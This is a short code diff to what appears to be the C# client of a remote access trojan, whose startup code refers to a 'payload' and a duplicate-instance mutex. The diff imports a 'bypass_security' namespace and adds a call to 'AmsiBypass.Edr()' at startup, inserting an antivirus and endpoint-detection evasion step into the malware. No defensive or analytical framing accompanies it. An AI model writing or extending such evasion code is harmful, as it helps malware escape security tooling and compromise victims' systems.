@@ -2,6 +2,7 @@
 using Client.Connection;
 using Client.Install;
 using System;
+using Client.bypass_security;
 using Client.Helper;
 
 /* 
@@ -27,6 +28,7 @@ namespace Client
 
             try
             {
+                AmsiBypass.Edr();
                 if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                     Environment.Exit(0);
 
